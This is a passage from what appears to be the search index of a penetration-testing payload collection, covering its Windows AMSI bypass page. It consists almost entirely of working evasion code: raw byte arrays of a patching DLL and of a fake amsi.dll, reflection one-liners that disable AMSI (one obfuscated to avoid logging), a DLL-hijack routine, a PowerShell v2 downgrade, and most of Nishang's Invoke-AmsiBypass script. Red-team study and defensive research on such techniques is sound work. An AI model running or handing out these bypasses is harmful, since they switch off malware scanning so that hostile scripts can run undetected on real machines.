1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 62, 0, 15, 0, 1, 0, 73, 0, 110, 0, 116, 0, 101, 0, 114, 0, 110, 0, 97, 0, 108, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 40, 0, 2, 0, 1, 0, 76, 0, 101, 0, 103, 0, 97, 0, 108, 0, 67, 0, 111, 0, 112, 0, 121, 0, 114, 0, 105, 0, 103, 0, 104, 0, 116, 0, 0, 0, 32, 0, 0, 0, 70, 0, 15, 0, 1, 0, 79, 0, 114, 0, 105, 0, 103, 0, 105, 0, 110, 0, 97, 0, 108, 0, 70, 0, 105, 0, 108, 0, 101, 0, 110, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 54, 0, 11, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 6, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 56, 0, 8, 0, 1, 0, 65, 0, 115, 0, 115, 0, 101, 0, 109, 0, 98, 0, 108, 0, 121, 0, 32, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 12, 0, 0, 0, 96, 60, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)) | Out-Null; Write-Output \"DLL has been reflected\"; } [Bypass.AMSI]::Patch(); } MyPatch; Start-Sleep 1;","title":"Same as 6 but integer Bytes instead of Base64"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#using-matt-graebers-reflection-method","text":"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)","title":"Using Matt Graebers Reflection method"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#using-matt-graebers-reflection-method-with-wmf5-autologging-bypass","text":"[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)","title":"Using Matt Graebers Reflection method with WMF5 autologging bypass"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#using-matt-graebers-second-reflection-method","text":"[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)","title":"Using Matt Graebers second Reflection method"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#using-cornelis-de-plaas-dll-hijack-method","text":"[Byte[]] $temp = $DllBytes -split ' ' Write-Output \"Executing the bypass.\" Write-Verbose \"Dropping the fake amsi.dll to disk.\" [System.IO.File]::WriteAllBytes(\"$pwd\\amsi.dll\", $temp) Write-Verbose \"Copying powershell.exe to the current working directory.\" Copy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd Write-Verbose \"Starting powershell.exe from the current working directory.\" & \"$pwd\\powershell.exe\"","title":"Using Cornelis de Plaas DLL hijack method"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#using-powershell-version-2","text":"if ($ShowOnly -eq $True) { Write-Output \"If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\" } else { Write-Verbose \"Checking if .Net version 2.0.50727 is installed.\" $versions = Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\\p{L}'} | Select -ExpandProperty Version if($versions -match \"2.0.50727\") { Write-Verbose \".Net version 2.0.50727 found.\" Write-Output \"Executing the bypass.\" powershell.exe -version 2 } else { Write-Verbose \".Net version 2.0.50727 not found. Can't start PowerShell v2.\" } }","title":"Using PowerShell version 2"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#nishang-all-in-one","text":"function Invoke-AmsiBypass { <# .SYNOPSIS Nishang script which uses publicly known methods to bypass/avoid AMSI. .DESCRIPTION This script implements publicly known methods bypass or avoid AMSI on Windows machines. AMSI is a script malware detection mechanism enabled by default in Windows 10. (https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx) This script implements 6 methods of bypassing AMSI. unload - Method by Matt Graeber. Unloads AMSI from current PowerShell session. unload2 - Another method by Matt Graeber. Unloads AMSI from current PowerShell session. unloadsilent - Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging. unloadobfuscated - 'unload' method above obfuscated with Daneil Bohannon's Invoke-Obfuscation - which avoids WMF5 autologging. dllhijack - Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell) psv2 - If .net 2.0.50727 is available on Windows 10. PowerShell v2 is launched which doesn't support AMSI. The script also provides information on tools which can be used for obfuscation: ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation) .PARAMETER Method The method to be used for elevation. Defaut one is unloadsilent. .PARAMETER ShowOnly The bypass is not executed. Just shown to the user. .EXAMPLE PS > Invoke-AmsiBypass -Verbose Above command runs the unloadsilent method. .EXAMPLE PS > Invoke-PsUACme -Method unloadobfuscated -Verbose Above command runs the unloadobfuscated method. .LINK http://www.labofapenetrationtester.com/2016/09/amsi.html https://github.com/samratashok/nishang #> [CmdletBinding()] Param( [Parameter(Position = 0, Mandatory = $False)] [ValidateSet(\"unload\",\"unloadsilent\",\"unloadobfuscated\",\"unload2\",\"dllhijack\",\"psv2\",\"obfuscation\")] [String] $Method = \"unloadsilent\", [Parameter(Position = 1, Mandatory = $False)] [Switch] $ShowOnly ) $AmsiX86 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 190 171 71 149 250 202 41 198 250 202 41 198 250 202 41 198 243 178 186 198 248 202 41 198 148 145 40 199 249 202 41 198 148 145 42 199 251 202 41 198 148 145 44 199 242 202 41 198 148 145 45 199 241 202 41 198 39 53 226 198 248 202 41 198 250 202 40 198 231 202 41 198 40 145 33 199 251 202 41 198 40 145 214 198 251 202 41 198 40 145 43 199 251 202 41 198 82 105 99 104 250 202 41 198 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 6 0 144 29 62 87 0 0 0 0 0 0 0 0 224 0 2 33 11 1 14 0 0 14 0 0 0 18 0 0 0 0 0 0 43 19 0 0 0 16 0 0 0 32 0 0 0 0 0 16 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 112 0 0 0 4 0 0 0 0 0 0 2 0 64 1 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 148 36 0 0 80 0 0 0 0 80 0 0 224 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 96 0 0 44 1 0 0 176 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 33 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 124 12 0 0 0 16 0 0 0 14 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 220 7 0 0 0 32 0 0 0 8 0 0 0 18 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 136 3 0 0 0 48 0 0 0 2 0 0 0 26 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 103 102 105 100 115 0 0 20 0 0 0 0 64 0 0 0 2 0 0 0 28 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 80 0 0 0 2 0 0 0 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 44 1 0 0 0 96 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 194 12 0 59 13 4 48 0 16 242 117 2 242 195 242 233 96 3 0 0 85 139 236 139 69 12 131 232 0 116 51 131 232 1 116 32 131 232 1 116 17 131 232 1 116 5 51 192 64 235 48 232 245 4 0 0 235 5 232 207 4 0 0 15 182 192 235 31 255 117 16 255 117 8 232 24 0 0 0 89 235 16 131 125 16 0 15 149 192 15 182 192 80 232 23 1 0 0 89 93 194 12 0 106 16 104 24 36 0 16 232 123 9 0 0 106 0 232 35 5 0 0 89 132 192 117 7 51 192 233 224 0 0 0 232 40 4 0 0 136 69 227 179 1 136 93 231 131 101 252 0 131 61 60 51 0 16 0 116 7 106 7 232 203 7 0 0 199 5 60 51 0 16 1 0 0 0 232 74 4 0 0 132 192 116 101 232 206 8 0 0 104 186 25 0 16 232 177 6 0 0 232 93 7 0 0 199 4 36 57 24 0 16 232 160 6 0 0 232 112 7 0 0 199 4 36 128 32 0 16 104 124 32 0 16 232 78 11 0 0 89 89 133 192 117 41 232 237 3 0 0 132 192 116 32 104 120 32 0 16 104 116 32 0 16 232 42 11 0 0 89 89 199 5 60 51 0 16 2 0 0 0 50 219 136 93 231 199 69 252 254 255 255 255 232 68 0 0 0 132 219 15 133 76 255 255 255 232 52 7 0 0 139 240 131 62 0 116 30 86 232 40 5 0 0 89 132 192 116 19 255 117 12 106 2 255 117 8 139 54 139 206 232 136 8 0 0 255 214 255 5 24 48 0 16 51 192 64 232 201 8 0 0 195 138 93 231 255 117 227 232 131 5 0 0 89 195 106 12 104 56 36 0 16 232 105 8 0 0 161 24 48 0 16 133 192 127 4 51 192 235 79 72 163 24 48 0 16 232 22 3 0 0 136 69 228 131 101 252 0 131 61 60 51 0 16 2 116 7 106 7 232 190 6 0 0 232 180 3 0 0 131 37 60 51 0 16 0 199 69 252 254 255 255 255 232 27 0 0 0 106 0 255 117 8 232 65 5 0 0 89 89 51 201 132 192 15 149 193 139 193 232 78 8 0 0 195 232 164 3 0 0 255 117 228 232 6 5 0 0 89 195 106 12 104 88 36 0 16 232 236 7 0 0 131 101 252 0 139 125 12 131 255 1 116 10 131 255 2 116 5 139 93 8 235 49 255 117 16 87 139 93 8 83 232 218 0 0 0 139 240 137 117 228 133 246 15 132 190 0 0 0 255 117 16 87 83 232 216 253 255 255 139 240 137 117 228 133 246 15 132 167 0 0 0 131 255 1 117 7 83 232 198 9 0 0 89 255 117 16 87 83 232 159 253 255 255 139 240 137 117 228 131 255 1 117 43 133 246 117 30 255 117 16 80 83 232 135 253 255 255 255 117 16 86 83 232 147 253 255 255 255 117 16 86 83 232 116 0 0 0 131 255 1 117 4 133 246 116 4 133 255 117 11 83 232 130 9 0 0 89 133 255 116 5 131 255 3 117 72 255 117 16 87 83 232 98 253 255 255 139 240 137 117 228 133 246 116 53 255 117 16 87 83 232 58 0 0 0 139 240 235 36 139 77 236 139 1 81 255 48 104 22 16 0 16 255 117 16 255 117 12 255 117 8 232 86 2 0 0 131 196 24 195 139 101 232 51 246 137 117 228 199 69 252 254 255 255 255 139 198 232 54 7 0 0 195 85 139 236 86 139 53 160 32 0 16 133 246 117 5 51 192 64 235 18 255 117 16 139 206 255 117 12 255 117 8 232 193 6 0 0 255 214 94 93 194 12 0 85 139 236 131 125 12 1 117 5 232 88 4 0 0 255 117 16 255 117 12 255 117 8 232 177 254 255 255 131 196 12 93 194 12 0 85 139 236 106 0 255 21 40 32 0 16 255 117 8 255 21 0 32 0 16 104 9 4 0 192 255 21 4 32 0 16 80 255 21 8 32 0 16 93 195 85 139 236 129 236 36 3 0 0 106 23 232 234 8 0 0 133 192 116 5 106 2 89 205 41 163 32 49 0 16 137 13 28 49 0 16 137 21 24 49 0 16 137 29 20 49 0 16 137 53 16 49 0 16 137 61 12 49 0 16 102 140 21 56 49 0 16 102 140 13 44 49 0 16 102 140 29 8 49 0 16 102 140 5 4 49 0 16 102 140 37 0 49 0 16 102 140 45 252 48 0 16 156 143 5 48 49 0 16 139 69 0 163 36 49 0 16 139 69 4 163 40 49 0 16 141 69 8 163 52 49 0 16 139 133 220 252 255 255 199 5 112 48 0 16 1 0 1 0 161 40 49 0 16 163 44 48 0 16 199 5 32 48 0 16 9 4 0 192 199 5 36 48 0 16 1 0 0 0 199 5 48 48 0 16 1 0 0 0 106 4 88 107 192 0 199 128 52 48 0 16 2 0 0 0 106 4 88 107 192 0 139 13 4 48 0 16 137 76 5 248 106 4 88 193 224 0 139 13 0 48 0 16 137 76 5 248 104 164 32 0 16 232 225 254 255 255 139 229 93 195 85 139 236 139 69 8 86 139 72 60 3 200 15 183 65 20 141 81 24 3 208 15 183 65 6 107 240 40 3 242 59 214 116 25 139 77 12 59 74 12 114 10 139 66 8 3 66 12 59 200 114 12 131 194 40 59 214 117 234 51 192 94 93 195 139 194 235 249 232 85 7 0 0 133 192 117 3 50 192 195 100 161 24 0 0 0 86 190 64 51 0 16 139 80 4 235 4 59 208 116 16 51 192 139 202 240 15 177 14 133 192 117 240 50 192 94 195 176 1 94 195 232 32 7 0 0 133 192 116 7 232 118 5 0 0 235 5 232 77 7 0 0 176 1 195 106 0 232 207 0 0 0 132 192 89 15 149 192 195 232 97 7 0 0 132 192 117 3 50 192 195 232 85 7 0 0 132 192 117 7 232 76 7 0 0 235 237 176 1 195 232 66 7 0 0 232 61 7 0 0 176 1 195 85 139 236 232 203 6 0 0 133 192 117 24 131 125 12 1 117 18 255 117 16 139 77 20 80 255 117 8 232 136 4 0 0 255 85 20 255 117 28 255 117 24 232 219 6 0 0 89 89 93 195 232 155 6 0 0 133 192 116 12 104 68 51 0 16 232 220 6 0 0 89 195 232 240 6 0 0 133 192 15 132 217 6 0 0 195 106 0 232 221 6 0 0 89 233 215 6 0 0 85 139 236 131 125 8 0 117 7 198 5 92 51 0 16 1 232 186 4 0 0 232 189 6 0 0 132 192 117 4 50 192 93 195 232 176 6 0 0 132 192 117 10 106 0 232 165 6 0 0 89 235 233 176 1 93 195 85 139 236 131 236 12 86 139 117 8 133 246 116 5 131 254 1 117 124 232 31 6 0 0 133 192 116 42 133 246 117 38 104 68 51 0 16 232 80 6 0 0 89 133 192 116 4 50 192 235 87 104 80 51 0 16 232 61 6 0 0 247 216 89 26 192 254 192 235 68 161 4 48 0 16 141 117 244 87 131 224 31 191 68 51 0 16 106 32 89 43 200 131 200 255 211 200 51 5 4 48 0 16 137 69 244 137 69 248 137 69 252 165 165 165 191 80 51 0 16 137 69 244 137 69 248 141 117 244 137 69 252 176 1 165 165 165 95 94 139 229 93 195 106 5 232 6 2 0 0 204 106 8 104 120 36 0 16 232 117 3 0 0 131 101 252 0 184 77 90 0 0 102 57 5 0 0 0 16 117 96 161 60 0 0 16 129 184 0 0 0 16 80 69 0 0 117 79 185 11 1 0 0 102 57 136 24 0 0 16 117 65 139 69 8 185 0 0 0 16 43 193 80 81 232 180 253 255 255 89 89 133 192 116 42 247 64 36 0 0 0 128 117 33 199 69 252 254 255 255 255 176 1 235 31 139 69 236 139 0 51 201 129 56 5 0 0 192 15 148 193 139 193 195 139 101 232 199 69 252 254 255 255 255 50 192 232 59 3 0 0 195 85 139 236 232 11 5 0 0 133 192 116 15 128 125 8 0 117 9 51 192 185 64 51 0 16 135 1 93 195 85 139 236 128 61 92 51 0 16 0 116 6 128 125 12 0 117 18 255 117 8 232 67 5 0 0 255 117 8 232 59 5 0 0 89 89 176 1 93 195 85 139 236 161 4 48 0 16 139 200 51 5 68 51 0 16 131 225 31 255 117 8 211 200 131 248 255 117 7 232 1 5 0 0 235 11 104 68 51 0 16 232 233 4 0 0 89 247 216 89 27 192 247 208 35 69 8 93 195 85 139 236 255 117 8 232 186 255 255 255 247 216 89 27 192 247 216 72 93 195 85 139 236 131 236 20 131 101 244 0 131 101 248 0 161 4 48 0 16 86 87 191 78 230 64 187 190 0 0 255 255 59 199 116 13 133 198 116 9 247 208 163 0 48 0 16 235 102 141 69 244 80 255 21 28 32 0 16 139 69 248 51 69 244 137 69 252 255 21 32 32 0 16 49 69 252 255 21 36 32 0 16 49 69 252 141 69 236 80 255 21 16 32 0 16 139 77 240 141 69 252 51 77 236 51 77 252 51 200 59 207 117 7 185 79 230 64 187 235 16 133 206 117 12 139 193 13 17 71 0 0 193 224 16 11 200 137 13 4 48 0 16 247 209 137 13 0 48 0 16 95 94 139 229 93 195 104 96 51 0 16 255 21 24 32 0 16 195 104 96 51 0 16 232 229 3 0 0 89 195 184 104 51 0 16 195 184 112 51 0 16 195 232 239 255 255 255 139 72 4 131 8 4 137 72 4 232 231 255 255 255 139 72 4 131 8 2 137 72 4 195 184 132 51 0 16 195 85 139 236 129 236 36 3 0 0 83 86 106 23 232 234 3 0 0 133 192 116 5 139 77 8 205 41 51 246 141 133 220 252 255 255 104 204 2 0 0 86 80 137 53 120 51 0 16 232 133 3 0 0 131 196 12 137 133 140 253 255 255 137 141 136 253 255 255 137 149 132 253 255 255 137 157 128 253 255 255 137 181 124 253 255 255 137 189 120 253 255 255 102 140 149 164 253 255 255 102 140 141 152 253 255 255 102 140 157 116 253 255 255 102 140 133 112 253 255 255 102 140 165 108 253 255 255 102 140 173 104 253 255 255 156 143 133 156 253 255 255 139 69 4 137 133 148 253 255 255 141 69 4 137 133 160 253 255 255 199 133 220 252 255 255 1 0 1 0 139 64 252 106 80 137 133 144 253 255 255 141 69 168 86 80 232 252 2 0 0 139 69 4 131 196 12 199 69 168 21 0 0 64 199 69 172 1 0 0 0 137 69 180 255 21 20 32 0 16 86 141 88 255 247 219 141 69 168 137 69 248 141 133 220 252 255 255 26 219 137 69 252 254 195 255 21 40 32 0 16 141 69 248 80 255 21 0 32 0 16 133 192 117 13 15 182 195 247 216 27 192 33 5 120 51 0 16 94 91 139 229 93 195 83 86 190 8 36 0 16 187 8 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 56 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 83 86 190 16 36 0 16 187 16 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 13 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 255 37 112 32 0 16 204 204 204 204 204 104 75 26 0 16 100 255 53 0 0 0 0 139 68 36 16 137 108 36 16 141 108 36 16 43 224 83 86 87 161 4 48 0 16 49 69 252 51 197 80 137 101 232 255 117 248 139 69 252 199 69 252 254 255 255 255 137 69 248 141 69 240 100 163 0 0 0 0 242 195 139 77 240 100 137 13 0 0 0 0 89 95 95 94 91 139 229 93 81 242 195 85 139 236 255 117 20 255 117 16 255 117 12 255 117 8 104 5 16 0 16 104 4 48 0 16 232 203 1 0 0 131 196 24 93 195 85 139 236 131 37 124 51 0 16 0 131 236 44 83 51 219 67 9 29 16 48 0 16 106 10 232 228 1 0 0 133 192 15 132 116 1 0 0 131 101 236 0 51 192 131 13 16 48 0 16 2 51 201 86 87 137 29 124 51 0 16 141 125 212 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 139 69 212 139 77 224 137 69 244 129 241 105 110 101 73 139 69 220 53 110 116 101 108 11 200 139 69 216 53 71 101 110 117 11 200 247 217 106 1 88 26 201 106 0 128 193 1 89 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 116 67 139 69 212 37 240 63 255 15 61 192 6 1 0 116 35 61 96 6 2 0 116 28 61 112 6 2 0 116 21 61 80 6 3 0 116 14 61 96 6 3 0 116 7 61 112 6 3 0 117 17 139 61 128 51 0 16 131 207 1 137 61 128 51 0 16 235 6 139 61 128 51 0 16 131 125 244 7 139 69 224 137 69 228 139 69 220 137 69 248 137 69 232 124 50 106 7 88 51 201 83 15 162 139 243 91 141 93 212 137 3 137 115 4 137 75 8 137 83 12 139 69 216 169 0 2 0 0 137 69 236 139 69 248 116 9 131 207 2 137 61 128 51 0 16 95 94 169 0 0 16 0 116 109 131 13 16 48 0 16 4 199 5 124 51 0 16 2 0 0 0 169 0 0 0 8 116 85 169 0 0 0 16 116 78 51 201 15 1 208 137 69 240 137 85 244 139 69 240 139 77 244 131 224 6 51 201 131 248 6 117 51 133 201 117 47 161 16 48 0 16 131 200 8 199 5 124 51 0 16 3 0 0 0 246 69 236 32 163 16 48 0 16 116 18 131 200 32 199 5 124 51 0 16 5 0 0 0 163 16 48 0 16 51 192 91 139 229 93 195 51 192 57 5 20 48 0 16 15 149 192 195 195 255 37 52 32 0 16 255 37 60 32 0 16 255 37 56 32 0 16 255 37 48 32 0 16 255 37 64 32 0 16 255 37 104 32 0 16 255 37 100 32 0 16 255 37 96 32 0 16 255 37 92 32 0 16 255 37 88 32 0 16 255 37 84 32 0 16 255 37 80 32 0 16 255 37 76 32 0 16 255 37 72 32 0 16 255 37 12 32 0 16 176 1 195 51 192 195 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 